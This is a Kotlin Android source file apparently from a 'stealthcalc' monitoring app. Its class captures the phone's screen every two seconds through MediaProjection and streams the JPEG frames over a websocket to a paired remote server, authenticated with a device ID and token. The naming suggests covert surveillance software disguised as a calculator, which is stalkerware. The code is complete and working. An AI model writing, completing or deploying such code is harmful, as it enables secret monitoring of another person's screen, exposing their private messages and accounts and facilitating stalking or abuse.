package com.stealthcalc.monitoring.collector

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.WindowManager
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.websocket.WebSockets
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.Frame
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ScreenStreamCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private val scope = CoroutineScope(Dispatchers.IO)
    private var streamJob: Job? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    val isStreaming: Boolean get() = streamJob?.isActive == true

    fun setMediaProjection(resultCode: Int, data: Intent) {
        val manager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = manager.getMediaProjection(resultCode, data)
    }

    @SuppressLint("WrongConstant")
    fun startStreaming(intervalMs: Long = 2000L) {
        if (streamJob?.isActive == true) return
        val projection = mediaProjection ?: return
        val baseUrl = repository.serverUrl.trimEnd('/')
        if (baseUrl.isBlank() || !repository.isPaired) return

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val scale = 0.5f
        val width = (metrics.widthPixels * scale).toInt()
        val height = (metrics.heightPixels * scale).toInt()
        val density = metrics.densityDpi

        val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader = reader

        val display = projection.createVirtualDisplay(
            "stream",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface,
            null, null
        )
        virtualDisplay = display

        val wsUrl = baseUrl.replace("http://", "ws://").replace("https://", "wss://")
        val client = HttpClient(OkHttp) { install(WebSockets) }

        streamJob = scope.launch {
            runCatching {
                client.webSocket("$wsUrl/stream/${repository.deviceId}?token=${repository.authToken}") {
                    while (isActive) {
                        delay(intervalMs)
                        val frame = captureFrame(reader, width, height) ?: continue
                        send(Frame.Binary(true, frame))
                    }
                }
            }.onFailure { e ->
                AppLogger.log(context, "[agent]", "Screen stream error: ${e.message}")
            }
            client.close()
        }

        AppLogger.log(context, "[agent]", "Screen streaming started at ${width}x${height}")
    }

    fun stopStreaming() {
        streamJob?.cancel()
        streamJob = null
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        AppLogger.log(context, "[agent]", "Screen streaming stopped")
    }

    fun release() {
        stopStreaming()
        mediaProjection?.stop()
        mediaProjection = null
    }

    private fun captureFrame(reader: ImageReader, width: Int, height: Int): ByteArray? {
        val image = reader.acquireLatestImage() ?: return null
        return try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * width

            val bitmap = Bitmap.createBitmap(
                width + rowPadding / pixelStride, height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            val cropped = if (bitmap.width > width) {
                Bitmap.createBitmap(bitmap, 0, 0, width, height).also {
                    if (it !== bitmap) bitmap.recycle()
                }
            } else bitmap

            val out = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 50, out)
            cropped.recycle()
            out.toByteArray()
        } finally {
            image.close()
        }
    }
}
